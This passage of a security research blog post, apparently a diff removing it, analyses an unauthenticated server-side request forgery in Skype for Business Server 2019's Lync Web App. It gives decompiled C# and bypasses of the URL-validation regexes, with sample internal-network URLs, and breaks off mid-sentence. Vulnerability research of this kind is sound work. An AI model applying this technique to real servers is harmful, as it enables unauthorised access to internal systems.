-&lt;p&gt;&lt;img src=&quot;/assets/images/skypethings/skype_inetmgr.png&quot; alt=&quot;InetMgr&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Since we mentioned the term “internet perimeter breach” above, the focus will again be on the “External Web Site” configurations.
-The target we chose was the URI path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/lwa&lt;/code&gt; which stands for &lt;strong&gt;Lync Web App&lt;/strong&gt;. The corresponding App Pool is named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LyncExtFeature&lt;/code&gt;.
-The file system location of interest can usally be found at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Program Files\Skype for Business Server 2019\Web Components\LWA\Ext&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web.config&lt;/code&gt; file the following declaration is made:&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;defaultDocument&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;files&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;clear/&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LwaClient.aspx&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/files&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/defaultDocument&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The ASPX file mentioned is located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Program Files\Skype for Business Server 2019\Web Components\LWA\Ext\WebPages&lt;/code&gt;
-and the first line reads:&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; CodeBehind=&quot;LwaClient.aspx.cs&quot; Inherits=&quot;Lync.Client.PreAuth.LwaClient&quot; Async=&quot;true&quot; %&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Browsing to this ASPX file is indeed possible without further authentication needed as also indicated by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreAuth&lt;/code&gt; key word being part of the namespace.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skypethings/skype_lwaaspx.png&quot; alt=&quot;LWA_ASPX&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We attach &lt;em&gt;dnSpy&lt;/em&gt; to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;w3wp.exe&lt;/code&gt; process with the App Pool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LyncExtFeature&lt;/code&gt; and load all .NET assemblies/modules into the debugger.
-Looking into the class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lync.Client.PreAuth.LwaClient&lt;/code&gt; reveals that it inherits from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.Web.UI.Page&lt;/code&gt; so we can usually expect several methods like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Page_Init&lt;/code&gt; and/or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Page_Load&lt;/code&gt; being implemented (see any blog on “ASP.NET Page Life Cycle”).&lt;/p&gt;
-
-&lt;p&gt;But the most interesting implementation is an asynchronous one called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PageLoadInternal()&lt;/code&gt;. Several user-controlled
-parameter are easily spotted in the first lines of code &lt;em&gt;[1], [2]&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QueryString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LwaLocale&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;UrlDecode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QueryString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;reachLocale&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[1]&lt;/span&gt;
-		&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;joinXml&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LwaClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Base64DecodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QueryString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[2]&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;If no query parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml&lt;/code&gt; is provided, the following if-statement turns out to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; &lt;em&gt;[3]&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;joinXml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[3]&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wpp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Level&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wpp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;n&quot;&gt;WPP_2897018b9080d7ca34b73bbf6c519b5b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WPP_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IntPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;meetUrl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LwaClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Base64DecodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QueryString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;meeturl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[4]&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The query parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meeturl&lt;/code&gt; now get evaluated at &lt;em&gt;[4]&lt;/em&gt; and we’re almost there, looking at the SSRF.&lt;/p&gt;
-
-&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CmsLWAValidateMeetUrlFlag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-					&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ValidateMeetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;meetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[5]&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;meetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[6]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Accept&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Application/vnd.microsoft.lync.meeting+xml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserAgent&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;LCS-Server&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpWebResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpWebResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetResponseAsync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[7]&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StreamReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;StreamReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetResponseStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;joinXml&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadToEndAsync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Some kind of &lt;em&gt;validation&lt;/em&gt; in &lt;em&gt;[5]&lt;/em&gt; seems to take place. We’ll look into this in a minute.
-If the validation turns out to be successful, an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpWebRequest&lt;/code&gt; object is created &lt;em&gt;[6]&lt;/em&gt; and fires &lt;em&gt;[7]&lt;/em&gt;
-in an asynchronous manner. If we could inject an arbitrary URL with &lt;strong&gt;full control including query parameters&lt;/strong&gt; etc.,
-a powerful SSRF would have been born (a &lt;em&gt;blind&lt;/em&gt; one though). Thanks to the Base64 encoding, one doesn’t even
-have to take care (a lot) on weird characters etc.&lt;/p&gt;
-
-&lt;p&gt;But let’s investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ValidateMeetUrl&lt;/code&gt; &lt;em&gt;[5]&lt;/em&gt; method first.&lt;/p&gt;
-
-&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ValidateMeetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;meetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wpp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Level&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wpp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;WPP_2897018b9080d7ca34b73bbf6c519b5b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WPP_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IntPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-		&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;(https?:\\/\\/(www\\.)|(www\\.))?.*(\\.\\w{2,4})\\/.*\\/[a-zA-Z0-9]*\\/?$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[8]&lt;/span&gt;
-		&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Regex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;meetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-		&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;^(https?:\\/\\/(www\\.)|(www\\.))?.*(\\.\\w{2,4})\\/Meet\\/\\?.*\\/?$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//[9]&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Regex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;meetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It basically breaks down to defeat the regular expressions &lt;em&gt;[8]&lt;/em&gt; or &lt;em&gt;[9]&lt;/em&gt;. Intuitively, I chose the first one at &lt;em&gt;[8]&lt;/em&gt; (but does it matter? :-P). For this kind of regex testing, there are tons of online &lt;a href=&quot;https://www.regextester.com/&quot;&gt;regex testers&lt;/a&gt; available to play with expressions.&lt;/p&gt;
-
-&lt;p&gt;So it looks like the “idea” of this validation by the code author &lt;em&gt;could&lt;/em&gt; be based on the following thoughts (I’m just guessing here!). We do not differentiate between optional match groups for this interpretation.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Could be a valid domain name starting with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https&lt;/code&gt; (you’re stuck in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebRequest&lt;/code&gt; cast indeed)&lt;/li&gt;
-  &lt;li&gt;Could contain a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; prefix&lt;/li&gt;
-  &lt;li&gt;Domain could end with an TLD of length between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt;, e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de, com, army&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Last segment could contain an alpha-numeric sequence and we need another slash in there&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;So things like this should work.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skypethings/skype_regex1.png&quot; alt=&quot;Regex1&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;What about IP addresses? Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; is optional but constraint &lt;em&gt;3.&lt;/em&gt; exists: the fourth octet cannot be a single digit.
-Alright, this constraint is not too hard. Enough IP addresses left to do something evil.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skypethings/skype_regex2.png&quot; alt=&quot;Regex2&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A bit later, I realized that this could also become optional. But see the difference between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://10.0.0.1/whatever/iwant&lt;/code&gt; vs. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://10.0.0.10/whatever/iwant&lt;/code&gt;? Sometimes, your mind is playing tricks on you. :-P&lt;/p&gt;
-
-&lt;p&gt;What about queries? Exploiting a third-party system at least should take into account arbitrary query parameters.
-Yes, works also fine since most web apps from my experience simply ignore additional undefined query parameters.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skypethings/skype_regex3.png&quot; alt=&quot;Regex3&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Of course, if you already know the Windows Domain name (e.g. obtained from one of the Skype endpoints talking NTLM),
